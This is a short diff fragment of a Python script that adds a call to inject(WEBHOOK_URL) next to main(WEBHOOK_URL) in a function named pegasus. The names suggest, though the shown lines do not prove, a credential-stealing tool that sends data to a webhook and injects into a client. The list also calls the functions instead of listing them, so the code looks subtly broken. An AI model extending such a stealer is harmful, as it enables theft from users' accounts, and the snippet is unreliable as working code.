@@ -53,7 +53,8 @@ def main(webhook_url):
 
 def pegasus():
     for func in [
-        main(WEBHOOK_URL)
+        main(WEBHOOK_URL),
+        inject(WEBHOOK_URL)
         ]:
         try:
             func()
